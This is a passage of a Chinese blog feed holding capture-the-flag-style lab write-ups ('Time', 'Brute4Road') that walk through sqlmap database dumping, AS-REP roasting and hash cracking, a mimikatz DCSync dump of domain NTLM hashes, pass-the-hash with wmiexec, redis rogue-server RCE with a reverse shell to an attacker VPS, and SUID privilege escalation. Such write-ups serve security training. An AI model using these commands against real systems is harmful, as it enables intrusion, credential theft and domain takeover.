class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">68</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://172.22.6.38</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.22.6.38/</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Priority</span><span class="token punctuation">:</span> <span class="token header-value">u=0, i</span></span>username=admin&amp;password=123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接sqlmap一把梭试试，把上面这个http请求包保存为1.txt</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225094046157.png" alt="image-20250225094046157"></p><p>拿到第二个flag</p><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225093921074.png" alt="image-20250225093921074"></p><p>还有 oa 的 admin 账密和一堆疑似是域用户名的数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">+----+------------------+---------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> password         <span class="token operator">|</span> username      <span class="token operator">|</span>+----+------------------+---------------+<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> bo2y8kAL3HnXUiQo <span class="token operator">|</span> administrator <span class="token operator">|</span>+----+------------------+---------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>因为之前提示了 Kerberos 认证相关，先写个脚本把用户名提取出来保存为user.txt</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token comment"># 打开原始数据文件</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/root/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_users.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 提取指定字符串</span>users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> line <span class="token keyword">in</span> data<span class="token punctuation">:</span>    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(\w+)@xiaorang.lab'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token comment"># 保存提取后的字符串到 user.txt</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'user.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>user <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后用 impacket 的 GetNPUsers 枚举未设置预认证的账号，打 AS-REP Roasting（这个东西默认是不关闭的，但当关闭了预身份验证后，攻击者可以使用指定用户向域控制器的Kerberos  88端口请求票据，此时域控不会进行任何验证就将TGT和该用户Hash加密的Login Session Key  返回。因此，攻击者就可以对获取到的用户Hash加密的 Login Session Key  进行离线破解，如果字典够强大，则可能破解得到该指定用户的明文密码）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 GetNPUsers.py -dc-ip <span class="token number">172.22</span>.6.12 <span class="token parameter variable">-usersfile</span> /tools/user.txt xiaorang.lab/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225100249181.png" alt="image-20250225100249181"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$wenshao</span>@XIAORANG.LAB:d19174e7aae7ac542312c3b63112d18e<span class="token variable">$3f7b1abe75b15fc561d0c74e8a1e906ee0a615f51dccb9dcc6e0729e8759f9210b00c9ff53e9c7b4b0b62b4e3fadaecaa3a74ec3ae010f17003979cc4ca68190721646226c26edc98dc6de2f462b1752f7bf0d8f4e9b6261c5b214746fbc7b051f851213c2c10c655df3ca68ca3e784bf9e61fade9fffbf8b23a54e033b0d91bf2f613a8614926badd8172987c39bfa415a532b6402fc12354132b4ec6611a6737ffc737ba116621f65a8a97956bb76222a6f31f4bc5778f157622ee36a695f78ff933714fd2f3830559fdc2513035981ca667a0fe9a7ae5404ff2b98344a454bd6f5b0a4336da32819b8920</span><span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$zhangxin</span>@XIAORANG.LAB:d793cda385d3c71b78e2b58d687e5635<span class="token variable">$52b5edc499f1e93bc023f54039fab7b645ee90bbd72e1f8df31c93bd8a50b008396f2fb99c8ae325eaf7452a4f5073a8bc6ad70d73f598a0b8603677013e48e0f9adba9ffeb7b2b410709817f091f21677e3cdb48df01da8e351d2011a0adaa85dc4af7d85229a586a2ef6e7c75b02d2e32e5694157faf7a41f55c9b09849d240e3b1ea33e9d5cb74415ccd3d082f9ab560b148da108e5c6902ae044afc17c99306c6d4926f765474a92d69254fa9a927ba05075d9f5a3b40b20d72a709d1c0ac436e8bef62796b75b0d210c3859957656e25d4cd37ba8b93442d28bfc9f90007029d10e3756737dbe8140b1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿到两组用户凭据</p><p>hashcat 跑 rockyou（kali 2g内存不够用，得上4g才能爆）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">18200</span> hash.txt <span class="token parameter variable">-a</span> <span class="token number">0</span> /usr/share/wordlists/rockyou.txt <span class="token parameter variable">--force</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225102059158.png" alt="image-20250225102059158"></p><p>成功爆出密码</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">wenshao:hellokittyzhangxin:strawberry<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后用 crackmapexec 跑 rdp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> crackmapexec rdp <span class="token number">172.22</span>.6.0/24 <span class="token parameter variable">-u</span> wenshao <span class="token parameter variable">-p</span> hellokitty <span class="token parameter variable">-d</span> xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是我的python依赖版本不对还更新不上导致跑不起来，换windows了</p><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225144849203.png" alt="image-20250225144849203"></p><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225145027844.png" alt="image-20250225145027844"></p><p>于是登录 172.22.6.25，注意账户名要带上前面的域 xiaorang.lab\wenshao</p><p>查看下用户</p><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225145454001.png" alt="image-20250225145454001"></p><p>疑似开了Windows自动登录，所以可以抓密码</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg query <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225145923756.png" alt="image-20250225145923756"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">DefaultUserName    REG_SZ    yuxuanDefaultPassword    REG_SZ    Yuxuan7QbrgZ3LDefaultDomainName    REG_SZ    xiaorang<span class="token punctuation">.</span>lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>换 xiaorang.lab\yuxuan 这个账号登了一下，用 BloodHound 分析域内关系，参考：<a href="https://xz.aliyun.com/news/6907">https://xz.aliyun.com/news/6907</a></p><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225153825715.png" alt="image-20250225153825715"></p><p>把解压的json导入即可看到域内关系</p><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225154227590.png" alt="image-20250225154227590"></p><h1 id="SID历史功能滥用"><a href="#SID历史功能滥用" class="headerlink" title="SID历史功能滥用"></a>SID历史功能滥用</h1><p>可以看到这个用户滥用了SID历史功能</p><blockquote><p>SIDHistory 是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的 SID 作为该对象的 objectSid，在之前域中的 SID 会添加到该对象的 sIDHistory 属性中，此时该对象将保留在原来域的 SID 对应的访问权限</p></blockquote><p>先上猕猴桃抓一下</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:xiaorang.lab /all /csv"</span> <span class="token string">"exit"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">mimikatz<span class="token punctuation">(</span>commandline<span class="token punctuation">)</span> <span class="token comment"># lsadump::dcsync /domain:xiaorang.lab /all /csv</span><span class="token namespace">[DC]</span> <span class="token string">'xiaorang.lab'</span> will be the domain<span class="token namespace">[DC]</span> <span class="token string">'DC-PROGAME.xiaorang.lab'</span> will be the DC server<span class="token namespace">[DC]</span> Exporting domain <span class="token string">'xiaorang.lab'</span><span class="token namespace">[rpc]</span> Service  : ldap<span class="token namespace">[rpc]</span> AuthnSvc : GSS_NEGOTIATE <span class="token punctuation">(</span>9<span class="token punctuation">)</span>1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        5121104    gaiyong 52c909941c823dbe0f635b3711234d2e        5121106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        5121107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        5121108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        5121109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        5121110    lvhui   f58b31ef5da3fc831b4060552285ca54        5121111    wenbo   9abb7115997ea03785e92542f684bdde        5121112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        5121113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        5121115    yangju  1fa8c6b4307149415f5a1baffebe61cf        5121117    weicheng        796a774eace67c159a65d6b86fea1d01        5121118    weixian 8bd7dc83d84b3128bfbaf165bf292990        5121119    haobei  045cc095cc91ba703c46aa9f9ce93df1        5121120    jizhen  1840c5130e290816b55b4e5b60df10da        5121121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        5121122    rubao   d8bd6484a344214d7e0cfee0fa76df74        5121123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        5121124    tangshun        90b8d8b2146db6456d92a4a133eae225        5121125    liangliang      c67cd4bae75b82738e155df9dedab7c1        5121126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        5121127    chouqian        c6f0585b35de1862f324bc33c920328d        5121128    jicheng 159ee55f1626f393de119946663a633c        5121129    xiyi    ee146df96b366efaeb5138832a75603b        5121130    beijin  a587b90ce9b675c9acf28826106d1d1d        5121131    chenghui        08224236f9ddd68a51a794482b0e58b5        5121132    chebin  b50adfe07d0cef27ddabd4276b3c3168        5121133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        5121134    yanglang        91c5550806405ee4d6f4521ba6e38f22        5121135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        5121136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        5121137    hongzhi f815bf5a1a17878b1438773dba555b8b        5121138    gaijin  b1040198d43631279a63b7fbc4c403af        5121139    yifu    4836347be16e6af2cd746d3f934bb55a        5121140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        5121141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        5121142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        5121143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        5121145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        5121146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        5121147    lili    b290a36500f7e39beee8a29851a9f8d5        5121148    huabi   02fe5838de111f9920e5e3bb7e009f2f        5121149    rangsibo        103d0f70dc056939e431f9d2f604683c        5121150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        5121151    haoguang        33efa30e6b3261d30a71ce397c779fda        5121152    langying        52a8a125cd369ab16a385f3fcadc757d        5121153    diaocai a14954d5307d74cd75089514ccca097a        5121154    lianggui        4ae2996c7c15449689280dfaec6f2c37        5121155    manxue  0255c42d9f960475f5ad03e0fee88589        5121156    baqin   327f2a711e582db21d9dd6d08f7bdf91        5121157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        5121158    louyou  a97ba112b411a3bfe140c941528a4648        5121159    maqun   485c35105375e0754a852cee996ed33b        5121160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        5121161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        5121163    chuyuan 0cfdca5c210c918b11e96661de82948a        5121164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        5121165    yulvxue cf970dea0689db62a43b272e2c99dccd        5121166    luyue   274d823e941fc51f84ea323e22d5a8c4        5121167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        5121168    pangzhen        51d37e14983a43a6a45add0ae8939609        5121169    guohong d3ce91810c1f004c782fe77c90f9deb6        5121170    lezhong dad3990f640ccec92cf99f3b7be092c7        5121171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        5121172    dujian  8f7846c78f03bf55685a697fe20b0857        5121173    lidongjin       34638b8589d235dea49e2153ae89f2a1        5121174    hongqun 6c791ef38d72505baeb4a391de05b6e1        5121175    yexing  34842d36248c2492a5c9a1ae5d850d54        5121176    maoda   6e65c0796f05c0118fbaa8d9f1309026        5121177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        5121000    DC-PROGAME$     25ac4f988a525288ff2d112d3e7e2954        5324801178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        42603521179    zhangxin        d6c5976e07cdb410be19b84126367e3d        42603521181    WIN2019$        79c15f63810988cec86ec6e70ecd3305        40961180    yuxuan  376ece347142d1628632d440530e8eed        66048mimikatz<span class="token punctuation">(</span>commandline<span class="token punctuation">)</span> <span class="token comment"># exit</span>Bye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接把域管理员 Administrator 哈希dump了，所以相当于已经拿下域控了</p><p>哈希传递登一下其他两台机器拿一下flag就结束了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 wmiexec.py <span class="token parameter variable">-hashes</span> :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.25 <span class="token parameter variable">-codec</span> gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225152158556.png" alt="image-20250225152158556"></p><p>看提示感觉预期解是本地先提权再dump hash？</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 wmiexec.py <span class="token parameter variable">-hashes</span> :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.12 <span class="token parameter variable">-codec</span> gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225152333404.png" alt="image-20250225152333404"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/08/31/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7time/&quot;&gt;https://fushuling.com/index.php/2023/08/31/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7time/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2023/08/chunqiuyunjing-time-writeup/&quot;&gt;https://exp10it.io/2023/08/chunqiuyunjing-time-writeup/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bowuchuling.github.io/posts/chunqiu_Time&quot;&gt;https://bowuchuling.github.io/posts/chunqiu_Time&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>春秋云境 Brute4Road</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/</id>
    <published>2025-02-24T15:10:56.000Z</published>
    <updated>2025-02-24T18:28:27.561Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://fushuling.com/index.php/2023/09/03/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7brute4road/">https://fushuling.com/index.php/2023/09/03/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7brute4road/</a></p><p><a href="https://exp10it.io/2023/08/chunqiuyunjing-brute4road-writeup/">https://exp10it.io/2023/08/chunqiuyunjing-brute4road-writeup/</a></p><span id="more"></span><hr><h1 id="redis主从复制rce"><a href="#redis主从复制rce" class="headerlink" title="redis主从复制rce"></a>redis主从复制rce</h1><p>fscan扫一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">39.98</span>.118.103 <span class="token parameter variable">-p</span> <span class="token number">1</span>-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250224231859293.png" alt="image-20250224231859293"></p><p>直接扫出一个 redis 未授权，主从复制rce：<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 redis-rogue-server.py <span class="token parameter variable">--rhost</span> <span class="token number">39.98</span>.118.103 <span class="token parameter variable">--lhost</span> vps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250224232637926.png" alt="image-20250224232637926"></p><p>第一个 ip 地址是题目地址，第二个地址是自己 vps 的地址，记得开启 21000 端口，执行成功后选择正向 shell 或反向 shell，然后输入弹的地址与端口即可</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250224232925882.png" alt="image-20250224232925882"></p><h1 id="base64提权"><a href="#base64提权" class="headerlink" title="base64提权"></a>base64提权</h1><p>测试提权命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250224233043689.png" alt="image-20250224233043689"></p><p>很明显能用base64提权，找到 flag1 在 &#x2F;home&#x2F;redis&#x2F;flag&#x2F; 下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">base64 <span class="token string">"/home/redis/flag/flag01"</span> <span class="token operator">|</span> base64 <span class="token parameter variable">--decode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250224233444882.png" alt="image-20250224233444882"></p><p>flag01: <code>flag&#123;53e1be23-fcbc-4371-ac73-7b8185500892&#125;</code></p><hr><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>用 wget 下载我们需要的文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> vps:80/fscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意如果没有 <code>ifconfig</code> 和 <code>ip addr</code> 的话可以读 &#x2F;etc&#x2F;hosts 获取内网网段</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250224233955143.png" alt="image-20250224233955143"></p><p>fscan 开扫</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">172.22</span>.2.7/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果目标主机: <span class="token number">172.22</span>.2.16主机名: MSSQLSERVER发现的网络接口:   IPv4地址:      └─ <span class="token number">172.22</span>.2.16<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果目标主机: <span class="token number">172.22</span>.2.3主机名: DC发现的网络接口:   IPv4地址:      └─ <span class="token number">172.22</span>.2.3<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 系统信息 <span class="token number">172.22</span>.2.3 <span class="token punctuation">[</span>Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果目标主机: <span class="token number">172.22</span>.2.34主机名: CLIENT01发现的网络接口:   IPv4地址:      └─ <span class="token number">172.22</span>.2.34<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 系统信息 <span class="token number">172.22</span>.2.16 <span class="token punctuation">[</span>Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.2.34     XIAORANG<span class="token punctuation">\</span>CLIENT01             <span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.2.16     MSSQLSERVER.xiaorang.lab            Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.2.3      DC:DC.xiaorang.lab               Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 匿名登录成功<span class="token operator">!</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> <span class="token number">172.22</span>.2.34 CVE-2020-0796 SmbGhost Vulnerable<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> SMB认证成功 <span class="token number">172.22</span>.2.18:445 administrator:123456<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.2.18     WORKGROUP<span class="token punctuation">\</span>UBUNTU-WEB02        <span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> SMB2共享信息 <span class="token number">172.22</span>.2.18:445 administrator Pass:123456 共享:<span class="token punctuation">[</span>print$ IPC$<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> SMB2共享信息 <span class="token number">172.22</span>.2.16:445 admin Pass:123456 共享:<span class="token 